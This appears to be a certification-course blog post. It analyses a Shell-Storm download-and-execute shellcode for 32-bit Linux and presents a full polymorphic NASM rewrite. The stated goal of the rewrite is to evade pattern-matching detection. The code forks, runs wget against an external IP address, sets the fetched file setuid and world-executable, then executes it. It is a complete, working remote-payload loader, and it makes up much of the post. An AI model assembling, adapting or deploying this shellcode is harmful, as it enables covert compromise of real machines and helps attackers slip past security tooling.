# Assignment 6: Download and Execute

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger than 150% of the existing shellcode
- Bonus points for making it shorter in length than original

## Solution

In this post we are going to look at the Download and Execute shellcode avaiable at ![http://shell-storm.org/shellcode/files/shellcode-862.php](http://shell-storm.org/shellcode/files/shellcode-862.php "").

### Shellcode Analysis

Tracing the instruction set, we observe that the shellcode first creates a child process (a copy) of itself with the `fork()` system call. The child process is used to download the file that later on is executed by the parent process. Since a child process will return a Process ID of `0`, while the parent process will return a non-zero Process ID, the execution flow is able to determine which instruction set it should execute even though the processes are copies. If PID is zero, the program will go ahead and jump to the download section of the code, where it will use the `execve()` system call to execute `/usr/bin/wget 192.168.2.222//x`. 

While the child process is being executed, the parent process goes on to execute the `waitpid()` system call with PID equal to zero (child process). The  `waitpid()` system  call  suspends execution of the calling process until a child specified by PID argument has changed state. By default, `waitpid()` waits only for terminated children. So, the parent process waits for the download to finish and then goes on to execute the rest of the instructions. 

The parents first uses the `chmod()` system call to execute `chmod 777` on the downloaded file, and then finally proceeds to execute the downloaded file with the `execve()` system call.

It is interesting to note that it was necessary to `fork()` a child in this case because `execve()` does not return execution back to the code that called it. Therefore, by using separate processes for downloading and executing, along with the `waitpid()` functionality, it was possible to execute `execve()` twice from the same shellcode.

### Polymorphic Shellcode

The technique used in the original shellcode sample is entirely replicated in the polymorphic version. Nevertheless, the instruction set is completely different (except for constant strings, such as `/usr/bin/wget` that could of course be used as a fingerprint). Even though Using an encoder would help to remediate this limitation, the shellcode presented here does not include that functionality. It is rather made to be as short as possible.

### a6-dlexec.nasm
```nasm
; SLAE Assignment 6: Download Chmod Execute (morphed)
; http://shell-storm.org/shellcode/files/shellcode-862.php
; Original Shellcode Length:	108
; Morphed Shellcode Length:		96


global _start
section .text
_start:
	push byte 0x2 		; #define __NR_fork 2
	pop eax 			; pid_t fork(void);			--> in child returns 0
	int 0x80 			; make a child
	jz short download 	; if this is a child, download

zzz:
	push byte 0x7 		; #define __NR_waitpid 7
	pop eax 			; pid_t wait(int *status);
	int 0x80 			; wait for the child (download)

chmod:
	push byte 0xf 		; #define __NR_chmod 15
	pop eax 			; int chmod(const char *path, mode_t mode);
	push edx
	push byte 0x62		; b
	mov ebx, esp 		; *path -> b
	push word 0x9ed 	; 4755 (octal)
	pop ecx 			; mode = 4755 
	int 0x80 			; chmod

execve:
	push byte 0xb 		; #define __NR_execve 11
	pop eax 			; int execve(const char *filename, char *const argv[], char *const envp[]);
	push byte 0x62 		; b
	mov ebx, esp 		; *filename -> b
	push edx 			; NULL
	mov edx, esp  		; *envp[] -> 0
	push ebx 			; put filename on the stack
	mov ecx, esp		; *argv[] -> b\0
	int 0x80

download:
	push 0xb			; #define __NR_execve 11
	pop eax				; int execve(const char *filename, char *const argv[], char *const envp[]);
	cdq 				; *envp[] -> 0
	push edx
	push 0x622f3832		; b/82
	push 0x2e333532		; .352
	push 0x2e303231		; .021
	push 0x2e383831		; .881
	mov ecx, esp		; *argv[] -> 188.120.253.28/b
	push edx
	push 0x74			; t
	push 0x6567772f		; egw/
	push 0x6e69622f		; nib/
	push 0x7273752f		; rsu/
	mov ebx, esp		; *filename -> /usr/bin/wget
	push edx
	push ecx
	push ebx
	mov ecx, esp		
	int 0x80 			; download
```

As can be observed and verified, the morphed version is 12 bytes shorter than the original sample from Shell-Storm.

